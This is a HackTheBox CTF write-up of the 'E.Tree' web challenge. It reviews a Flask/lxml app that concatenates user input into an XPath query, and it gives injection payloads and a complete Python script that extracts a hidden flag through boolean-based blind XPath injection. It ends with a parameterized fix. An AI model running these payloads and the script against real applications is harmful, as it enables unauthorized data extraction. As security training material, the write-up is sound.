---
layout: ctf
title: "HackTheBox: E.Tree"
platform: "HackTheBox"
type: "Challenge"
difficulty: "Easy"
image: "/assets/img/ctf/web_challenge.png"
tags: [Web, Code-Review, XPath-Injection, Blind-Injection, Boolean-Based, XML, Python, Flask, lxml]
date: 2026-06-30
---

# 🎯 E.Tree

**Category:** Web | **Difficulty:** Easy

![etree.htb](/assets/img/ctf/data/etree-htb.png)

---

## ⛓️ TL;DR / Attack Chain

1. **Vulnerability Discovery:** Source code analysis reveals that user input from the `/api/search` POST endpoint is directly concatenated into an XPath query string via an f-string.
2. **Exploitation:** Because the application only returns a generic success or failure message, a Boolean-based Blind XPath Injection vulnerability exists. An automation script is used to exfiltrate the flag character-by-character from hidden `<selfDestructCode>` tags.
3. **XPath 1.0 Bypass:** Since Python's `lxml` relies on XPath 1.0 (which lacks an `ends-with()` function), a custom workaround combining `substring()` and `string-length()` is used to extract the second half of the flag backward.

---

## 🔍 1. Source Code Review

### Project Structure

```bash
…/web_etree/challenge ❯ ls
Permissions Size User      Date Modified Name
drwxr-xr-x     - tralsesec 21 Sep  2023   application
.rw-r--r--  3.0k tralsesec 21 Sep  2023  󰗀 military.xml
.rw-r--r--    10 tralsesec 21 Sep  2023   requirements.txt
.rw-r--r--    97 tralsesec 21 Sep  2023   run.py

```

### 1.1 run.py

```python
from application.app import app

app.run(host='0.0.0.0', port=1337, debug=True, use_evalex=False)

```

### 1.2 requirements.txt

```
Flask
lxml

```

### 1.3 military.xml

```xml
<?xml version="1.0" encoding="utf-8"?>
<military>
    <district id="DSC-N-1547">
        <staff>
            <name>Tomkrut</name>
            <age>18835</age>
            <rank>Sergeant</rank>
            <kills>777132</kills>
        </staff>
        ...
        <staff>
            <name>Groorg</name>
            <age>52420</age>
            <rank>Colonel</rank>
            <kills>4112825</kills>
            <selfDestructCode>HTB{f4k3_fl4g_</selfDestructCode>
        </staff>
    </district>
    <district id="DSC-N-1549">
        <staff>
            <name>Bobhura</name>
            <age>61792</age>
            <rank>Major</rank>
            <kills>5076298</kills>
            <selfDestructCode>f0r_t3st1ng}</selfDestructCode>
        </staff>
    </district>
</military>

```

The flag is split across different staff members and districts inside hidden `<selfDestructCode>` elements. To get the full flag, we will need to exfiltrate the contents of these hidden nodes.

### 1.4 application/

#### 1.4.1 util.py

```python
from lxml import etree

tree = etree.parse('military.xml')

def leaderboard(district_id):
    # This whole function is irrelevant to our exploit path
    ...

def search_staff(name):
    # Who cares about parameterization?
    query = f"/military/district/staff[name='{name}']"

    if tree.xpath(query):
        return {'success': 1, 'message': 'This military staff member exists.'}

    return {'failure': 1, 'message': 'This military staff member does not exist.'}

```

Looking closely at `search_staff()`, the `name` parameter is dropped straight into an f-string to build the XPath query. If we control this variable, we have a clear path to **XPath Injection**. (Note: This is distinct from XXE, as we are manipulating an existing query rather than forcing the XML parser to process external entities).

#### 1.4.2 blueprints/routes.py

```python
from flask import Blueprint, render_template, request
from application.util import leaderboard, search_staff

web = Blueprint('web', __name__)
api = Blueprint('api', __name__)

@web.route('/leaderboard')
def web_leaderboard():
    return render_template('leaderboard.html', leaderboard=leaderboard('DSC-N-1547'))

@api.route('/search', methods=['POST'])
def api_search():
    name = request.json.get('search', '')
    return search_staff(name)

```

The `leaderboard()` function is safe because it only handles a hardcoded string (`'DSC-N-1547'`). However, the `/api/search` endpoint takes input directly from the user's POST JSON body (`request.json.get('search', '')`) and passes it into `search_staff()`. This makes `/api/search` our target endpoint.

---

## 🚪 2. Initial Foothold

To test the injection, we can send a classic tautology payload: `' or '1'='1`

![etree-1.htb](/assets/img/ctf/data/etree-1.png)

When processed by the server, the raw query changes from:
`"/military/district/staff[name='{name}']"`

Into this:
`"/military/district/staff[name='' or '1'='1']"`

Because `'1'='1'` is always true, the query matches every staff member in the document. The server returns a success message: `This military staff member exists.`

Since the application only returns a generic success or failure message without dumping actual node content, we have to perform a **Boolean-based Blind XPath Injection** attack. We can do this by asking the application true/false questions to brute-force the flag character-by-character:

1. Send a payload testing if a flag fragment starts/ends with a specific string.
2. If the server responds with a success message, we save that character and move to the next position.
3. If it returns a failure message, we try the next character in our charset.

The baseline payload for the first half of the flag uses `starts-with()`:
`' or starts-with(selfDestructCode, 'HTB{') or '`

This translates into the final executed query:
`"/military/district/staff[name='' or starts-with(selfDestructCode, 'HTB{') or '']"`

### The XPath 1.0 Hurdle

The flag is split into two fragments: one starting with `HTB{` and another ending with `}`. While `starts-with()` is supported globally, `ends-with()` is an XPath 2.0 feature. Because Python's `lxml` runs on XPath 1.0, using `ends-with()` triggers an evaluation error.

To check if a string ends with our target characters, we can use a clever mathematical workaround combining `substring()` and `string-length()`:
`substring(selfDestructCode, string-length(selfDestructCode) - string-length('}') + 1) = '}'`

This slices the end of the string based on the length of our guess and checks if it matches, effectively mimicking `ends-with()`.

---

## 🦅 3. Exploitation

By combining both payload strategies into a higher-order Python script, we can automate the extraction. We build the first fragment from left to right, and the second fragment from right to left (prepending characters from the closing bracket).

```python
import string
import requests

# CHANGE THIS - Target instance address
address = "154.57.164.82:30210"

# Endpoint
url = f"http://{address}/api/search"

def search_staff(name):
    return requests.post(url, json={"search": name}).json()

def extract_flag(search_value: str, payload_builder, prepend: bool = False) -> str:
    charset = string.ascii_letters + string.digits + "{}_-!?@$"
    current_flag = search_value

    print(f"[*] Found: {current_flag}", end='\r')

    while True:
        character_found = False

        for char in charset:
            # Swap growth direction based on forward or backward building
            candidate_string = char + current_flag if prepend else current_flag + char
            payload = payload_builder(candidate_string)
            response = search_staff(payload)

            if 'success' in response:
                current_flag = candidate_string
                print(f"[+] Found: {current_flag}", end='\r')
                character_found = True
                break

        if not character_found:
            print("\n[*] No more matching characters found.")
            break

        if not prepend and current_flag.endswith('}'):
            print("\n[+] Hit the end of the flag segment!")
            break

    return current_flag

def payload_builder_startswith(input_str: str) -> str:
    return f"' or starts-with(selfDestructCode, '{input_str}') or '"

def payload_builder_endswith(input_str: str) -> str:
    # We omit the closing quote to leverage the application's native trailing quote
    return f"' or substring(selfDestructCode, string-length(selfDestructCode) - string-length('{input_str}') + 1) = '{input_str}"

print("--- Extracting First Fragment ---")
fragment_one = extract_flag("HTB{", payload_builder_startswith, prepend=False)

print("\n--- Extracting Second Fragment ---")
fragment_two = extract_flag("}", payload_builder_endswith, prepend=True)

print(f"\n[!] Combined Flag: {fragment_one}{fragment_two}")

```

Running the script successfully extracts and prints both halves of the flag.

![etree-2.htb](/assets/img/ctf/data/etree-2.png)

---

## 💉 4. Fix

The vulnerability stems entirely from treating user input as executable code logic through string concatenation. To remediate this, the input must be parameterized using variable bindings provided by the XPath engine:

```python
def search_staff(name):
    # Parameterization safely handles user input as data
    query = "/military/district/staff[name=$staff_name]"
    
    if tree.xpath(query, staff_name=name):
        return {'success': 1, 'message': 'This military staff member exists.'}
    return {'failure': 1, 'message': 'This military staff member does not exist.'}

```

By defining `$staff_name` inside the query and passing the data via `staff_name=name`, the query parser treats the payload as a literal string value, breaking the injection chain entirely.

---

## 🧠 Learnings

1. **Prioritize Query Parameterization Over Filters:** Security controls should never rely on string formatting (like f-strings) for query construction. Whether writing SQL, NoSQL, or XPath, always use built-in variable binding mechanisms to keep the data plane separated from the control plane.
2. **Account for Environment Limitations:** Development dependencies dictate available functionality. Knowing that Python's default XML utilities stick to XPath 1.0 highlights the importance of mastering core string manipulation formulas (like `substring`) to simulate modern query logic during testing or exploitation.
